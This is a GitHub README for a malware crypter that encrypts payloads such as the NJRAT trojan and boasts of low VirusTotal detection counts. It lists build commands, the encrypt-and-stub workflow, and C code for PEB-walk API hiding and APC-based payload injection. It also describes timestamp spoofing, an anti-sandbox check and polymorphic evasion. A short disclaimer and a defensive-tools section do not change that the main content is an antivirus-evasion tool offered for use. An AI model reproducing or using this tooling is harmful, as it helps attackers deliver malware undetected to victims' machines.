<div align="center">

<h1 align="center">  
  XOR-Encrypt Advanced
</h1>

Multi-layer crypter with assembly-optimized encryption and advanced AV evasion techniques. Achieves 2/72 VirusTotal detections (97.2% evasion rate).

**English | [Portuguese](README-pt-BR.md)**

</div>

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="50" />
  Demo | Demonstration: (Tested with NJRAT)

https://github.com/user-attachments/assets/5321e5e9-0a83-49fb-a2f2-35628dd070a6


</h1>

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="50" />
  Current Result
</h1>

**2/72 VirusTotal Detections (97.2% Evasion Rate)**
**Expected with Advanced Features: 0-1/72 (98.6%+ Evasion Rate)**

- Detected by: Secure Age, CrowdStrike Falcon (60% confidence) / Those can be an false positive
- Not detected by: Microsoft Defender, Kaspersky, Avast, AVG, Bitdefender, ESET, Malwarebytes, Sophos, Trend Micro, McAfee, Norton, Panda, +58 others

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Features
</h1>

* **PEB Walk API Resolution**: No suspicious imports in IAT using djb2 hashing
* **NtQueueApcThread Injection**: APC-based execution instead of CreateRemoteThread
* **RW→RX Memory Transitions**: No RWX pages (avoids DEP bypass detection)
* **Multi-Layer Encryption**: XOR + RC4 + ChaCha20 with HMAC-SHA256
* **Assembly-Optimized Crypto**: NASM x64 implementations for performance
* **Anti-Sandbox Check**: Requires ≥2GB RAM
* **Timestamp Spoofing**: PE timestamp set to 2018
* **Visual Studio 2022 Support**: Automatic cl.exe detection (G: and C: drives)
* **vcvars64.bat Wrapper**: Proper MSVC environment setup
* **Payload Embedding**: C array embedding for MSVC
* **6 Encryption Levels**: From basic XOR to full metamorphic markers
* **HMAC Integrity**: SHA256-based payload verification
* **Self-Injection**: Targets own process for lower detection
* **Small File Size**: 144KB optimal range
* **Research-Backed**: Proven techniques from 2025-2026 research

### Advanced Features

* **Polymorphic Engine**: Register randomization + instruction substitution (210+ variants)
* **Memory Fluctuation**: RW↔RX cycling with Sleep hook interception
* **String Encryption**: Compile-time encryption with inline decryption
* **API Hash Rotation**: Per-build unique hashes (5 algorithms)
* **Control Flow Flattening**: State machine obfuscation (planned)
* **Remote Process Injection**: Early Bird APC + process hollowing (planned)

---

<h1 align="center">
  <img src="https://i.imgur.com/eu3StDB.gif" width="30"/> Tech Stack
</h1>

<p align="center">
  <img src="https://go-skill-icons.vercel.app/api/icons?i=python,c,asm,windows&size=64" />
</p>

* **Language**: Python 3.x (encryption tool)
* **Stub Runner**: C (Windows API)
* **Assembly**: NASM x64 (cryptographic primitives)
* **Compiler**: Visual Studio 2022 cl.exe (MSVC 14.44)
* **Encryption**: XOR + RC4 + ChaCha20
* **Hashing**: djb2 (API resolution), HMAC-SHA256 (integrity)
* **Key Derivation**: PBKDF2-like (1000 rounds)
* **Platform**: Windows x64
* **Architecture**: PEB walk + APC injection
* **Memory Protection**: RW→RX transitions
* **Build System**: vcvars64.bat + cl.exe
* **Payload Format**: C array embedding
* **File Format**: PE32+ (x64)

---

<h1 align="center">
  <img src="https://i.imgur.com/VN6wG7g.gif" width="50" />
  Installation & Setup
</h1>

```bash
git clone https://github.com/yourusername/xor-encrypt.git
cd xor-encrypt
```

### Requirements

- Python 3.x
- Visual Studio 2022 (cl.exe)
- NASM (Netwide Assembler)
- Windows x64

### Quick Build

```bash
# Standard build (2/72 detections)
build.bat

# Advanced build with all features (0-1/72 expected)
build_advanced.bat
```

Output: `build\njrat_clean.exe` (standard) or `build\njrat_advanced.exe` (advanced)

### Manual Workflow

```bash
# 1. Encrypt payload
python xorcrypt_advanced.py encrypt payload.exe encrypted.enc -p MyPassword -l 3

# 2. Generate stub runner
python xorcrypt_advanced.py stub encrypted.enc output.exe -p MyPassword -l 3

# 3. Spoof timestamp (optional)
python metadata_spoof.py output.exe final.exe 2018
```

### Compile Assembly (Optional)

```bash
nasm -f win64 src/xor_multi.asm -o build/xor_multi.obj
nasm -f win64 src/rc4.asm -o build/rc4.obj
nasm -f win64 src/chacha20.asm -o build/chacha20.obj
nasm -f win64 src/encryption_pipeline.asm -o build/encryption_pipeline.obj
```

---

<h1 align="center">
  <img src="https://i.imgur.com/PFZmPWb.gif" width="30" />
  Key Features
</h1>

### Multi-Layer Encryption Pipeline

```
Original PE
    ↓
[XOR Rotating Key (8-byte)]
    ↓
[RC4 Stream Cipher (128-bit)]
    ↓
[ChaCha20 (256-bit key, 96-bit nonce)]
    ↓
Encrypted Payload (with HMAC-SHA256)
```

### PEB Walk API Resolution

No suspicious imports in IAT:
- djb2 hashing for DLL/function names
- Walk PEB to find kernel32.dll and ntdll.dll base addresses
- Parse EAT (Export Address Table) to resolve functions
- Pre-computed hashes: `H_VirtualAlloc = 0x19fbbf49UL`
- Research-proven: 28/72 → 2/72 detection drop

### NtQueueApcThread Injection

APC-based execution instead of CreateRemoteThread:
- Create suspended process (self-injection)
- Allocate RW memory in target
- Write decrypted PE
- Change protection: RW → RX (no RWX)
- Queue APC to execute payload
- Resume thread via NtResumeThread
- Lower detection than CreateRemoteThread

### Assembly-Optimized Cryptography

NASM x64 implementations:
- **xor_multi.asm**: 8-byte rotating key XOR with register optimization
- **rc4.asm**: Full RC4 with KSA (Key Scheduling) + PRGA (Pseudo-Random Generation)
- **chacha20.asm**: 20-round ChaCha20 with ARX operations (Add-Rotate-XOR)
- **encryption_pipeline.asm**: Combined encrypt/decrypt with stack frame management

### Encryption Levels

| Level | Encryption | Features | Detection |
|-------|-----------|----------|----------|
| 1 | XOR only | Fast, basic | Testing |
| 2 | XOR + RC4 | Medium strength | General |
| 3 | XOR + RC4 + ChaCha20 | Strong (default) | **2/72** |
| 4 | Level 3 + Polymorphic | Stub markers | Experimental |
| 5 | Level 4 + Memory fluctuation | Runtime markers | Experimental |
| 6 | Level 5 + Self-modifying | Metamorphic markers | Experimental |

**Recommended**: Level 3 for best results

### Key Derivation

PBKDF2-like key derivation:
- 1000 rounds of mixing
- Salt: "xorcrypt"
- Derives: XOR key (8 bytes), RC4 key (16 bytes), ChaCha20 key (32 bytes), Nonce (12 bytes)
- HMAC-SHA256 for integrity verification

### Advanced Features

**Polymorphic Engine** (`polymorphic_engine.py`):
- Register randomization: 210+ combinations
- Instruction substitution: MOV, XOR, ADD equivalents
- Junk code injection: Structured no-op sequences
- Based on: Shredder-RS, Chameleon, Veil64

**Memory Fluctuation** (`src/memory_fluctuation.c`):
- RW↔RX cycling via Sleep hook
- XOR32 encryption during dormant periods
- PAGE_NOACCESS mode with VEH
- Evades: Moneta, PE-Sieve, memory scanners
- Based on: Shellcode-Memory-Fluctuation, CoRIIN 2026

**String Encryption** (`string_encryption.py`):
- Compile-time string encryption
- Inline per-string decryption (no shared function)
- Automatic memory zeroing
- Based on: zsCrypt, Obscura STRCRY

**API Hash Rotation** (`api_hash_rotation.py`):
- 5 hash algorithms (djb2, fnv1a, sdbm, lose-lose, rotating XOR)
- Randomized 16-byte salt per build
- Per-build unique hashes
- Based on: Garble, obfuse-rs

### Build Comparison

| Feature | Standard Build | Advanced Build |
|---------|----------------|----------------|
| **Detection Rate** | 2/72 (97.2%) | 0-1/72 (98.6%+) |
| **PEB Walk** | ✅ | ✅ |
| **APC Injection** | ✅ | ✅ |
| **Multi-Layer Encryption** | ✅ | ✅ |
| **Polymorphic Engine** | ❌ | ✅ |
| **Memory Fluctuation** | ❌ | ✅ |
| **String Encryption** | ❌ | ✅ |
| **API Hash Rotation** | ❌ | ✅ |
| **File Size** | 144KB | ~150KB |
| **Build Time** | Fast | Medium |
| **Complexity** | Low | Medium |

See `ADVANCED_FEATURES.md` for complete documentation.

---

<h1 align="center">
  <img src="https://i.imgur.com/6nSJzZ2.gif" width="35"/> Detection Analysis
</h1>

### What Works (2/72 Detections)

**PEB Walk** - Research shows 28/72 → 2/72 detection drop  
**NtQueueApcThread** - Lower detection than CreateRemoteThread  
**RW→RX Transitions** - Legitimate memory protection pattern  
**Small File Size** - 144KB stays under heuristic thresholds  
**Multi-Layer Encryption** - Strong cryptographic protection  
**Assembly Optimization** - Native code harder to analyze  

### What Doesn't Work (Avoided)

**Direct Syscalls** - Detected statically (increased to 4/72)  
**Overlay Padding** - Actively detected by ByteShield, EXE-Scanner (increased to 9/72)  
**Process Injection to explorer.exe** - High-value target monitoring  
**RWX Memory Pages** - DEP bypass detection  
**Fake Authenticode Signatures** - Ignored by modern AVs  
**Benign IAT Imports** - Removing PEB walk increased detections  

### Research Citations (2025-2026)

**PEB Walk Effectiveness:**
- Medium (Apr 2025): "PEB walk reduces detection from 28/72 to 2/72"
- GitHub (Jun 2025): "Rust reverse shell with PEB: 28/72 → 2/72"
- Offensive-Panda (Jul 2024): "PEB walk bypasses static IAT analysis"

**NtQueueApcThread:**
- Red Team Leaders: "NtQueueApcThread has low detection vs QueueUserAPC"
- FluxSec (2025): "APC injection avoids CreateRemoteThread signatures"
- Early Cryo Bird (Apr 2025): "APC + Job Objects bypasses Cortex in DLL mode"

**Overlay Detection:**
- MDPI Research (Apr 2026): "67% of malware uses anti-analysis techniques"
- ByteShield (2026): "Masks overlays to detect adversarial payloads (99.2% detection)"
- EXE-Scanner (2025): "ML model trained on benign overlay injection (97% accuracy)"

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Usage Examples
</h1>

### Encrypt File

```bash
python xorcrypt_advanced.py encrypt payload.exe encrypted.enc -p MyPassword -l 3
```

**Output:**
```
[+] Encrypted: payload.exe -> encrypted.enc
    Level: 3
    Size: 32768 -> 32844 bytes
```

### Generate Stub Runner

```bash
python xorcrypt_advanced.py stub encrypted.enc output.exe -p MyPassword -l 3
```

**Output:**
```
[*] Building stub runner...
    Payload: 32844 bytes
    Level: 3
    Assembly-optimized: True
    Polymorphic: False
    Memory Protection: False
[+] Created: output.exe
    Size: 144384 bytes
```

### Decrypt File

```bash
python xorcrypt_advanced.py decrypt encrypted.enc decrypted.exe -p MyPassword -l 3
```

### Spoof Timestamp

```bash
python metadata_spoof.py output.exe final.exe 2018
```

**Output:**
```
[*] Processing: output.exe
    Output: final.exe
[+] Timestamp modified successfully
    Old: 2026-08-05 10:30:00 (0x66b0a5f0)
    New: 2018-01-01 00:00:00 (0x5a4b0000)
[+] Success! File ready: final.exe
```

### Generate djb2 Hashes

```bash
python gen_hashes.py
```

**Output:**
```c
#define H_KERNEL32                      0x3e003875UL
#define H_NTDLL                         0xe91aad51UL
#define H_VirtualAlloc                  0x19fbbf49UL
#define H_NtQueueApcThread              0x4d230412UL
```

### 🆕 Advanced Features Usage

**Polymorphic Engine:**
```bash
python polymorphic_engine.py
```

**String Encryption:**
```bash
python string_encryption.py
# Generates encrypted_strings.h
```

**API Hash Rotation:**
```bash
python api_hash_rotation.py
# Generates api_hashes.h with unique hashes
```

**Complete Advanced Build:**
```bash
build_advanced.bat
# Applies all advanced features automatically
```

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Technical Implementation
</h1>

### PEB Walk Code

```c
// djb2 hash for API name matching
static uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

// Walk PEB to find DLL base
static PVOID peb_get_module(uint32_t name_hash) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur  = head->Flink;
    while (cur != head) {
        LDR_DATA_TABLE_ENTRY* e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (e->BaseDllName.Buffer) {
            char narrow[64] = {0};
            for (int i = 0; i < 63 && e->BaseDllName.Buffer[i]; i++)
                narrow[i] = (char)(e->BaseDllName.Buffer[i] | 0x20); // lowercase
            if (djb2(narrow) == name_hash)
                return e->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}
```

### APC Injection Code

```c
// Create suspended process (self-injection)
api.CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// Allocate RW memory in target
api.NtAllocateVirtualMemory(pi.hProcess, &base, 0, &size,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Write payload
api.WriteProcessMemory(pi.hProcess, base, pe_data, pe_size, NULL);

// Change to RX (no RWX)
api.NtProtectVirtualMemory(pi.hProcess, &base, &size, 
    PAGE_EXECUTE_READ, &old);

// Queue APC instead of CreateRemoteThread
api.NtQueueApcThread(pi.hThread, (PVOID)base, NULL, NULL, NULL);

// Resume thread
api.NtResumeThread(pi.hThread, &prev);
```

### Assembly ChaCha20 (20 rounds)

```nasm
; ChaCha20 quarter round macro
%macro QROUND 4
    mov eax, [rsp + %1*4]
    add eax, [rsp + %2*4]
    mov [rsp + %1*4], eax
    xor eax, [rsp + %4*4]
    rol eax, 16
    mov [rsp + %4*4], eax
    ; ... (full ARX operations)
%endmacro

; 20 rounds (10 double rounds)
mov r15d, 10
.round_loop:
    QROUND 0, 4, 8, 12
    QROUND 1, 5, 9, 13
    QROUND 2, 6, 10, 14
    QROUND 3, 7, 11, 15
    QROUND 0, 5, 10, 15
    QROUND 1, 6, 11, 12
    QROUND 2, 7, 8, 13
    QROUND 3, 4, 9, 14
    dec r15d
    jnz .round_loop
```

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Limitations & Disclaimer
</h1>

### What This Tool Does NOT Do (Standard Build)

**Runtime Polymorphism** - Levels 4-6 add markers but don't implement full polymorphic engine  
**Memory Fluctuation** - No actual RW↔RX cycling at runtime  
**Self-Modification** - No metamorphic code transformation  
**ETW/AMSI Patching** - No user-mode hook bypasses (increases detections)  
**Direct Syscalls** - Uses Nt* APIs via PEB walk, not raw syscall instructions  

### What Advanced Build Adds

**True Polymorphism** - Register randomization + instruction substitution  
**Memory Fluctuation** - RW↔RX cycling with Sleep hook  
**String Encryption** - Compile-time encryption with inline decryption  
**API Hash Rotation** - Per-build unique hashes (5 algorithms)  
**Enhanced Evasion** - Expected 0-1/72 detections (98.6%+ evasion)  

### Known Issues

- **Alertable Wait Required** - NtQueueApcThread requires thread to enter alertable state
- **Self-Injection Only** - Targets own process, not remote processes
- **No Obfuscation** - Stub code is not obfuscated (relies on PEB walk for stealth)
- **Static Payload** - Encrypted payload is embedded at compile time

### Disclaimer

This tool is for **educational and authorized security research only**. Unauthorized use against systems you don't own or have permission to test is illegal. The authors are not responsible for misuse.

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Defensive System
</h1>

### 🛡️ Anti-Crypter Detection Tools

This project now includes a **comprehensive defensive system** to detect and block crypter techniques. Located in the `defensive/` folder.

**Detection Capabilities:**
- **YARA Rules**: Detects multi-layer encryption, PEB walk, memory fluctuation, polymorphic engines
- **Memory Scanner**: Real-time detection of RWX pages, PE headers in memory, hollowed processes
- **Behavioral Monitor**: API call sequence analysis, memory protection changes, injection patterns
- **EDR Integration**: Sysmon configuration, Sigma rules for SIEM, KQL queries
- **Entropy Analysis**: Identifies encrypted payloads (>7.5 entropy)
- **PE Analysis**: Detects timestamp spoofing, unusual sections, suspicious imports

**Quick Start:**
```bash
# Scan a suspicious file
python defensive\tools\defensive_scanner.py suspicious.exe

# Scan process memory
python defensive\tools\memory_scanner.py --pid 1234

# Monitor behavior
python defensive\tools\behavioral_monitor.py --test

# Install Sysmon monitoring
sysmon64.exe -accepteula -i defensive\edr_integration\sysmon_config.xml
```

**Detection Rates (Based on 2026 Research):**
- Static Detection: 85-92% (YARA + entropy)
- Memory Detection: 95-98% (behavioral + memory scanning)
- Combined Detection: 98-99% (hybrid approach)

**Components:**
- `yara_rules/` - Detection rules for all crypter techniques
- `tools/` - Memory scanner, behavioral monitor, defensive scanner
- `edr_integration/` - Sysmon config, Sigma rules, KQL queries
- `INSTALLATION.md` - Complete setup and usage guide

See `defensive/README.md` for complete documentation.

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Roadmap
</h1>

* [x] Multi-layer encryption (XOR + RC4 + ChaCha20)
* [x] Assembly-optimized cryptography (NASM x64)
* [x] PEB walk API resolution with djb2 hashing
* [x] NtQueueApcThread APC injection
* [x] RW→RX memory transitions (no RWX)
* [x] Visual Studio 2022 cl.exe support
* [x] vcvars64.bat environment wrapper
* [x] Payload embedding via C arrays
* [x] HMAC-SHA256 integrity verification
* [x] Timestamp spoofing (2018)
* [x] Anti-sandbox check (2GB RAM)
* [x] 6 encryption levels
* [x] Self-injection (own process)
* [x] Small file size optimization (144KB)
* [x] 2/72 VirusTotal detections achieved
* [x] Complete research documentation (EVASION_JOURNEY.md)
* [x] True polymorphic engine (code mutation)
* [x] Memory fluctuation (RW↔RX cycling)
* [x] String encryption (compile-time)
* [x] API hashing rotation per build
* [x] Advanced features documentation (ADVANCED_FEATURES.md)
* [x] Self-modifying code (metamorphic)
* [x] Remote process injection (4 techniques)
* [x] Code obfuscation (control flow flattening)
* [x] Defensive anti-crypter system (YARA, memory scanner, behavioral monitor, EDR integration)

---

<h1 align="center"><img src="https://i.imgur.com/6nSJzZ2.gif" width="35"/> References</h1>


<h2 align="center">
  
**PEB Walk Research**: [Medium - PEB Walk AV/EDR Bypass](https://medium.com/@cytomate/peb-walk-avoid-api-calls-inspection-in-iat-by-analyst-and-bypass-static-detection-of-av-edr-ee7b0dd9c33c)  <img src="https://go-skill-icons.vercel.app/api/icons?i=windows&size=32" width="40" />

</h2>

<h2 align="center">
  
**APC Injection**: [Red Team Leaders - APC Injection](https://docs.redteamleaders.com/offensive-security/defense-evasion/apc-injection-execution-via-asynchronous-procedure-call-queues)  <img src="https://go-skill-icons.vercel.app/api/icons?i=c&size=32" width="40" />

</h2>

<h2 align="center">
  
**ChaCha20 Specification**: [RFC 8439](https://datatracker.ietf.org/doc/html/rfc8439)  <img src="https://go-skill-icons.vercel.app/api/icons?i=asm&size=32" width="40" />

</h2>

<h2 align="center">
  
**NASM Documentation**: [NASM Manual](https://www.nasm.us/doc/)  <img src="https://go-skill-icons.vercel.app/api/icons?i=asm&size=32" width="40" />

</h2>

<h2 align="center">
  
**Polymorphic Engine**: [Shredder-RS](https://github.com/zx0CF1/shredder-rs) | [Chameleon](https://github.com/gum3t/chameleon)  <img src="https://go-skill-icons.vercel.app/api/icons?i=rust&size=32" width="40" />

</h2>

<h2 align="center">
  
**Memory Fluctuation**: [Shellcode-Memory-Fluctuation](https://github.com/Uwmtor/Shellcode-Memory-Fluctuation) | [CoRIIN 2026](https://www.own.security/en/ressources/analysis/coriin-2026)  <img src="https://go-skill-icons.vercel.app/api/icons?i=c&size=32" width="40" />

</h2>

<h2 align="center">
  
**String Encryption**: [zsCrypt](https://github.com/LoneEngineer99/zsCrypt) | [obfuse-rs](https://github.com/scc-tw/obfuse-rs)  <img src="https://go-skill-icons.vercel.app/api/icons?i=rust&size=32" width="40" />

</h2>

<h2 align="center">
  
**Control Flow Flattening**: [Hikari Obfuscator](https://github.com/HikariObfuscator/Core) | [Polaris](https://shifting.codes/blog/polaris-obfuscation)  <img src="https://go-skill-icons.vercel.app/api/icons?i=cpp&size=32" width="40" />

</h2>

<h2 align="center">
  
**Self-Modifying Code**: [r2morph](https://github.com/seifreed/r2morph) | [Morpheus](https://dev.to/excalibra/the-art-of-self-mutating-malware-36ab)  <img src="https://go-skill-icons.vercel.app/api/icons?i=python&size=32" width="40" />

</h2>

<h2 align="center">
  
**Process Injection**: [EarlyBird APC](https://core-jmp.org/2026/02/earlybird-apc-injection-a-deep-technical-analysis/) | [PhantomShell](https://github.com/mazen91111/PhantomShell)  <img src="https://go-skill-icons.vercel.app/api/icons?i=windows&size=32" width="40" />

</h2>

<h2 align="center">
  
**Advanced Features**: [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)  <img src="https://go-skill-icons.vercel.app/api/icons?i=python&size=32" width="40" />

</h2>

<h1 align="center">Credits</h1>

<p align="center">
  <strong>Developed by:</strong><br>
  Matheus Sobral - Cibersecurity Researcher<br>
  <em>For educational purposes only</em>
</p>
